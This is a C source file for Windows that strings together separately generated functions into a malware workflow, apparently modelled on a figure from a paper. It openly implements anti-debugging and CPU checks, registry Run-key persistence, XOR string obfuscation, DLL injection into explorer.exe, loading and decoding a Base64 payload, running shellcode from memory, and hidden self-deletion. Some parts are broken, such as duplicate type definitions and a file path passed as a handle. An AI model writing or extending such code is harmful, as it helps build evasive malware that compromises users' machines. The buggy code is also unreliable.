
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <wincrypt.h>
#include <intrin.h>


#include <windows.h>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

BOOL Debugger_Identification() {
    BOOL isDebuggerPresent = FALSE;
    BOOL remoteDebuggerPresent = FALSE;
    HANDLE hProcess = GetCurrentProcess();

    // 1. IsDebuggerPresent()
    if (IsDebuggerPresent()) {
        isDebuggerPresent = TRUE;
    }

    // 2. CheckRemoteDebuggerPresent()
    CheckRemoteDebuggerPresent(hProcess, &remoteDebuggerPresent);

    return isDebuggerPresent || remoteDebuggerPresent;
}

#include <windows.h>
#include <stdio.h>

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef NTSTATUS (NTAPI *RtlNtStatusToDosError)(NTSTATUS Status);
typedef NTSTATUS (NTAPI *NtQuerySystemInformation)(
    UINT SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef struct _SYSTEM_PROCESSOR_INFORMATION {
    WORD  ProcessorArchitecture;
    WORD  ProcessorLevel;
    WORD  ProcessorRevision;
    BYTE  Reserved;
    DWORD  ProcessorFeatureBits;
    DWORD  Reserved1;
} SYSTEM_PROCESSOR_INFORMATION, *PSYSTEM_PROCESSOR_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation,
    SystemProcessorInformation,
    SystemPerformanceInformation,
    SystemTimeOfDayInformation,
    SystemNotImplemented1,
    SystemProcessesAndThreadsInformation,
    SystemCallCounts,
    SystemConfigurationInformation,
    SystemProcessorPerformanceInformation,
    SystemGlobalFlagInformation,
    SystemNotImplemented2,
    SystemModuleInformation,
    SystemLockInformation,
    SystemNotImplemented3,
    SystemCrashDumpInformation,
    SystemExceptionInformation,
    SystemCrashDumpStateInformation,
    SystemQuotaInformation,
    SystemOverloadCounterInformation,
    SystemPplmInformation,
} SYSTEM_INFORMATION_CLASS;


BOOL CPU_Identification() {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (hNtdll == NULL) {
        return FALSE;
    }

    NtQuerySystemInformation NtQuerySystemInformationFunc = (NtQuerySystemInformation)GetProcAddress(hNtdll, "NtQuerySystemInformation");
    if (NtQuerySystemInformationFunc == NULL) {
        return FALSE;
    }

    SYSTEM_PROCESSOR_INFORMATION processorInfo;
    NTSTATUS status = NtQuerySystemInformationFunc(
        SystemProcessorInformation,
        &processorInfo,
        sizeof(SYSTEM_PROCESSOR_INFORMATION),
        NULL
    );

    if (status != 0) {
      return FALSE;
    }
    
    if (processorInfo.ProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
        return TRUE;
    } else {
        return FALSE;
    }
}

#include <windows.h>
#include <stdio.h>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

void AutoRun() {
    HKEY hKey;
    LONG result;
    wchar_t exePath[MAX_PATH];
    DWORD pathLength = MAX_PATH;

    if (GetModuleFileNameW(NULL, exePath, MAX_PATH) == 0) {
        return; // Failed to get executable path
    }

    result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hKey);
    if (result == ERROR_SUCCESS) {
        result = RegSetValueExW(hKey, L"MyApplication", 0, REG_SZ, (const BYTE*)exePath, (wcslen(exePath) + 1) * sizeof(wchar_t));

        if (result != ERROR_SUCCESS) {
            // Handle error setting value (e.g., print error code to console)
            printf("Error setting registry value: %ld\n", result);
        }

        RegCloseKey(hKey);
    } else {
        // Handle error opening key (e.g., print error code to console)
        printf("Error opening registry key: %ld\n", result);
    }
}

#include <windows.h>

void String_XOR(char *string, char *key) {
    int string_len = strlen(string);
    int key_len = strlen(key);

    for (int i = 0; i < string_len; i++) {
        string[i] = string[i] ^ key[i % key_len];
    }
}

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

void DLL_Injection(char *dll, char *process) {
    DWORD processID = 0;
    HANDLE hProcess = NULL;
    LPVOID LoadLibAddr = NULL;
    LPVOID RemoteStringAddr = NULL;
    HANDLE hThread = NULL;

    // Get process ID by process name
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE) {
        while (Process32Next(snapshot, &entry) == TRUE) {
            if (strcmp(entry.szExeFile, process) == 0) {
                processID = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);

    if (processID == 0) {
        fprintf(stderr, "Process not found!\n");
        return;
    }

    // Open the process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess == NULL) {
        fprintf(stderr, "OpenProcess failed: %d\n", GetLastError());
        return;
    }

    // Get the address of LoadLibraryA
    LoadLibAddr = GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (LoadLibAddr == NULL) {
        fprintf(stderr, "GetProcAddress(LoadLibraryA) failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    // Allocate memory in the remote process for the DLL path
    RemoteStringAddr = VirtualAllocEx(hProcess, NULL, strlen(dll) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (RemoteStringAddr == NULL) {
        fprintf(stderr, "VirtualAllocEx failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, RemoteStringAddr, dll, strlen(dll) + 1, NULL)) {
        fprintf(stderr, "WriteProcessMemory failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, RemoteStringAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Create a remote thread to call LoadLibraryA with the DLL path
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibAddr, RemoteStringAddr, 0, NULL);
    if (hThread == NULL) {
        fprintf(stderr, "CreateRemoteThread failed: %d\n", GetLastError());
        VirtualFreeEx(hProcess, RemoteStringAddr, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }

    // Wait for the thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Clean up
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, RemoteStringAddr, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}

#include <windows.h>

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

int
Load_From_File(void *file, void *buffer)
{
    HANDLE hFile = (HANDLE)file;
    DWORD fileSize;
    DWORD bytesRead;

    if (hFile == INVALID_HANDLE_VALUE) {
        return -1; // Indicate an error
    }

    fileSize = GetFileSize(hFile, NULL);

    if (fileSize == INVALID_FILE_SIZE) {
        return -1; // Indicate an error
    }

    if (ReadFile(hFile, buffer, fileSize, &bytesRead, NULL) == FALSE) {
        return -1; // Indicate an error
    }

    return (int)bytesRead;
}

#include <windows.h>
#include <wincrypt.h>

int Decode_Base64(void *encoded, int size, void *decoded) {
    DWORD dwDecodedSize = 0;
    BOOL bResult;

    // Step 1: Determine the required buffer size for the decoded data.
    // Call CryptStringToBinaryA with a NULL output buffer.
    bResult = CryptStringToBinaryA(
        (LPCSTR)encoded,        // Pointer to the base64 encoded string
        (DWORD)size,            // Length of the encoded string
        CRYPT_STRING_BASE64,    // Flag for Base64 decoding
        NULL,                   // Output buffer (NULL to get size)
        &dwDecodedSize,         // Pointer to receive the required size
        NULL,                   // Reserved, must be NULL
        NULL                    // Reserved, must be NULL
    );

    if (!bResult) {
        // An error occurred (e.g., invalid base64 string format).
        // Return 0 to indicate failure.
        return 0;
    }

    // Step 2: Perform the actual decoding into the provided buffer.
    // Use the determined size (dwDecodedSize) which will be updated
    // with the actual number of bytes written.
    bResult = CryptStringToBinaryA(
        (LPCSTR)encoded,        // Pointer to the base64 encoded string
        (DWORD)size,            // Length of the encoded string
        CRYPT_STRING_BASE64,    // Flag for Base64 decoding
        (PBYTE)decoded,         // Output buffer for decoded data
        &dwDecodedSize,         // Pointer to the actual size of the decoded data
        NULL,                   // Reserved, must be NULL
        NULL                    // Reserved, must be NULL
    );

    if (!bResult) {
        // An error occurred during decoding.
        // Return 0 to indicate failure.
        return 0;
    }

    // Return the size of the successfully decoded data.
    return (int)dwDecodedSize;
}

#include <windows.h>

typedef struct _UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    SHORT LoadCount;
    SHORT TlsIndex;
    LIST_ENTRY HashLinks;
    ULONG TimeDateStamp;
    PVOID DefaultLanguage;
    PVOID DefaultUiLanguage;
    PVOID DllCharacteristics;
    PVOID DllCheckSum;
    PVOID LoadedImports;
    PVOID EntryPointActivationContext;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
    PVOID ContextInformation;
    PVOID OriginalBase;
    LARGE_INTEGER LoadTime;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB_LDR_DATA {
    BYTE Length;
    BYTE Initialized;
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BYTE ShutdownInProgress;
    PVOID ShutdownThreadId;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE InheritedAddressSpace;
    BYTE ReadImageFileExecOptions;
    BYTE BeingDebugged;
    BYTE SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PVOID ProcessParameters;
    PVOID SubSystemData;
    PVOID ProcessHeap;
    PRTL_CRITICAL_SECTION FastPebLock;
    PVOID AtlThunkSListPtr;
    PVOID IFEOKey;
    ULONG CrossProcessFlags;
    ULONG UserSharedData;
    ULONG SpareUlong;
    ULONG nNumberOfProcessors;
    LARGE_INTEGER AlignedMask;
    union {
        ULONG MemoryManagementFlags;
        struct {
            ULONG LowFragmentation : 1;
            ULONG HardenedVa : 1;
        };
    };
    ULONG ImageBaseAddressSpaceUsage;
    ULONG ImageBaseAddressSpaceUsageMask;
    ULONG AppCompatInfo;
    ULARGE_INTEGER CSDVersion;
    PVOID ActivationContextData;
    PVOID ProcessAssemblyStorageMap;
    PVOID SystemDependencies;
    PVOID SxsContextList;
    PVOID ShimData;
    PVOID AppCompatFlags;
    PVOID AppCompatFlagsUser;
    PVOID pShimInfo;
    ULONG AppCompatFlagsProcess;
    ULONG AppVerifierFlags;
    PVOID AppVerifierFlagsUser;
    PVOID pfnAllocateUserPhysicalPages;
    PVOID pfnFreeUserPhysicalPages;
    PVOID pPhysicalVad;
    ULONG pProtectedProcesses;
    PVOID SessionId;
    ULARGE_INTEGER AppCompatCacheFlags;
    ULONG AppCompatFlagsUserReg;
    ULONG SpareUlong2;
    ULARGE_INTEGER TxnIsolationLevel;
    ULONG TxnIsolationFlags;
    ULONG SpareUlong3;
    ULONG SkipPatchingAlso;
    PVOID ShimEngine;
    PVOID MaxVcrRuntime;
    ULONG FilterBitmap;
    ULONG ActivityId;
    PVOID pHeapReplacementFunction;
    DWORD dwHotpatchGeneration;
    PVOID pContextData;
    PVOID pReserved[2];
    PVOID* pInstrumentationCallbackSpares;
    ULONG pInstrumentationFunction;
} PEB, *PPEB;

#ifdef _WIN64
#define PEB_OFFSET 0x60
#else
#define PEB_OFFSET 0x30
#endif

void Run_From_Memory(void *shellcode, int size) {
  DWORD oldProtect;
  void (*func)();

  VirtualProtect(shellcode, size, PAGE_EXECUTE_READWRITE, &oldProtect);

  func = (void (*)())shellcode;
  func();
}

#include <windows.h>
#include <stdio.h>

void Delete_File(char *filename) {
    if (DeleteFileA(filename)) {
        // File deleted successfully
    } else {
        // Handle the error if the file could not be deleted
        DWORD error = GetLastError();
        fprintf(stderr, "Error deleting file: %s, Error code: %lu\n", filename, error);
    }
}

#include <windows.h>
#include <stdio.h>

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

void Delete_Itself() {
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[MAX_PATH];
    STARTUPINFO si = {0};
    PROCESS_INFORMATION pi = {0};

    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    lstrcpy(szCmd, "cmd.exe /c del ");
    lstrcat(szCmd, szModuleName);
    lstrcat(szCmd, " /f /q");

    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    ExitProcess(0);
}


#include <windows.h>
#include <stdio.h>
#include <string.h>

// Function Prototypes (must match generated blocks)
BOOL Debugger_Identification();
BOOL CPU_Identification();
void AutoRun();
void String_XOR(char *string, char *key);
void DLL_Injection(char *dll, char *process);
int Load_From_File(void *file, void *buffer);
int Decode_Base64(void *encoded, int size, void *decoded);
void Run_From_Memory(void *shellcode, int size);
void Delete_File(char *filename);
void Delete_Itself();


int main() {
    // --- 1. Defense Evasion Checks ---
    
    // Check 1: Debugger Identification (Figure 6: Start -> Debugger Identification)
    printf("[*] Running Debugger Check...\n");
    if (Debugger_Identification()) {
        printf("[!] Debugger detected. Proceeding to Evasion/Exit routine.\n");
        goto EVASION_ROUTINE;
    }
    printf("[+] Debugger NOT detected. Continuing.\n");

    // Check 2: CPU Identification (Figure 6: Debugger Identification -> CPUID Check)
    printf("[*] Running CPU Identification Check (Intel target)...\n");
    if (!CPU_Identification()) {
        printf("[!] Target CPU NOT detected. Proceeding to Evasion/Exit routine.\n");
        goto EVASION_ROUTINE;
    }
    printf("[+] Target CPU detected. Continuing execution.\n");


    // --- 2. Core Malicious Actions ---
    
    // Action 1: Persistence (Figure 6: CPUID Check -> Set AutoRun)
    printf("[*] Setting Persistence (AutoRun)...\n");
    AutoRun();

    // Setup: XOR strings and buffers (for simplicity, we use hardcoded paths/names)
    char dll_name[] = "KERNEL32.DLL"; 
    char dll_key[] = "abc";
    char process_name[] = "explorer.exe";

    // Action 2: String XOR (Figure 6: Set AutoRun -> XOR String)
    printf("[*] XOR-ing DLL name string...\n");
    String_XOR(dll_name, dll_key);
    
    // Action 3: DLL Injection (Figure 6: XOR String -> Inject DLL)
    // NOTE: We XOR back here so DLL_Injection gets the plaintext name.
    String_XOR(dll_name, dll_key); 
    printf("[*] Injecting DLL into process: %s\n", process_name);
    DLL_Injection(dll_name, process_name);
    String_XOR(dll_name, dll_key); // Re-XOR for stealth

    // Action 4: Load and Decode Payload
    char file_path[] = "C:\\path\\to\\payload.b64";
    char payload_buffer[1024] = {0};
    unsigned char decoded_shellcode[1024] = {0};
    int n_read, n_decoded;

    // Load file (Figure 6: Load File)
    printf("[*] Loading payload from file: %s\n", file_path);
    n_read = Load_From_File(file_path, payload_buffer);
    
    // Decode Base64 (Figure 6: Decode Base64)
    printf("[*] Decoding Base64 payload (Size: %d)...\n", n_read);
    n_decoded = Decode_Base64(payload_buffer, n_read, decoded_shellcode);
    
    // Action 5: Execute Payload (Figure 6: Run Memory)
    if (n_decoded > 0) {
        printf("[*] Running shellcode from memory (Size: %d)...\n", n_decoded);
        Run_From_Memory(decoded_shellcode, n_decoded);
        printf("[+] Shellcode execution initiated.\n");
    } else {
        printf("[!] Payload decoding failed. Exiting.\n");
    }

    // --- 3. Normal Exit ---
    printf("[✔] Malicious workflow complete. Exiting normally.\n");
    return 0;


    // --- 4. Evasion and Exit Routine (Figure 6: Delete File -> Delete Itself -> Exit) ---
    EVASION_ROUTINE:
    
    // Action 6: Delete associated library file
    printf("[*] Deleting associated file: %s\n", dll_name);
    Delete_File(dll_name);
    
    // Action 7: Delete own executable
    printf("[*] Deleting self (Evidence removal)...\n");
    Delete_Itself();

    printf("[!] Evasion complete. Exiting.\n");
    return -1;
}
